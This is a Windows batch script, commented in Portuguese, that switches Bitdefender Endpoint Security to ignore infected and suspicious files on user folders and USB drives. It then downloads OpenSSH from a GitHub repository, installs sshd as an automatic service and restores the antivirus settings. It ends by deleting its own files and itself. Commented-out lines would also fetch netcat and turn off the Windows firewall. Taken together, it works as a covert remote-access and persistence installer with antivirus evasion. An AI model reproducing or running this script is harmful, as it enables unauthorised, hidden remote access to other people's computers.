@echo off

"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="c:\users\*" infectedAction1=ignore
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="c:\users\*" infectedAction2=ignore
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="c:\users\*" suspiciousAction1=ignore
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="c:\users\*" suspiciousAction2=ignore
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="%localappdata%" infectedAction1=ignore
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="%localappdata%" infectedAction2=ignore
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="%localappdata%" suspiciousAction1=ignore
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="%localappdata%" suspiciousAction2=ignore

::caminho pendrive 1

"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="d:\*" infectedAction1=ignore
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="d:\*" infectedAction2=ignore
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="d:\*" suspiciousAction1=ignore
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="d:\*" suspiciousAction2=ignore

::caminho pendrive 2

"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="e:\*" infectedAction1=ignore
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="e:\*" infectedAction2=ignore
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="e:\*" suspiciousAction1=ignore
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="e:\*" suspiciousAction2=ignore

::caminho pendrive 3

"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="f:\*" infectedAction1=ignore
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="f:\*" infectedAction2=ignore
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="f:\*" suspiciousAction1=ignore
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="f:\*" suspiciousAction2=ignore

powershell Invoke-WebRequest https://github.com/davebsd/senas/raw/main/OpenSSH-Win64.zip -outfile %temp%\OpenSSH-Win64.zip
::powershell Invoke-WebRequest https://github.com/davebsd/senas/raw/main/nc.zip -outfile %localappdata%\nc.zip

:: Descompactar arquivo
c:
cd %temp%
tar -xf %temp%\OpenSSH-Win64.zip
xcopy /E /Q /Y "%temp%\OpenSSH-Win64" "C:\Program Files\OpenSSH-Win64\"

cd "C:\Program Files\OpenSSH-Win64\"

:: Habilitar execução de script com assinatura
powershell Set-ExecutionPolicy RemoteSigned -Force

:: Executar script ps1
powershell cd 'C:\Program Files\OpenSSH-Win64\';.\install-sshd.ps1

:: Remover Habilitação de execução de script ps1
powershell Set-ExecutionPolicy Restricted -Force

:: setar windows firewall como off
::netsh advfirewall set allprofiles state off

:: Ativar o Servico OpenSSH e deixar o mesmo automatico
net start ssh-agent
net start sshd
powershell Set-Service -Name ssh-agent -StartupType Automatic
powershell Set-Service -Name sshd -StartupType Automatic

::cd %appdata%
::tar -xf %localappdata%\nc.zip 



rmdir /Q /S "%temp%\OpenSSH-Win64" 
del /F /Q "%temp%\OpenSSH-Win64.zip"
::del /F /Q "%localappdata%\microsoft\nc.zip"

"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="c:\users\*" infectedAction1=disinfect
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="c:\users\*" infectedAction2=quarantine

::caminho pendrive 1

"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="d:\*" infectedAction1=disinfect
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="d:\*" infectedAction2=quarantine

::caminho pendrive 2

"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="e:\*" infectedAction1=disinfect
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="e:\*" infectedAction2=quarantine

::caminho pendrive 3

"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="f:\*" infectedAction1=disinfect
"c:\program files\bitdefender\endpoint security\product.console.exe" /c FileScan.OnDemand.RunScanTask custom path="f:\*" infectedAction2=quarantine

del /Q /F %temp%\ssh.bat && exit
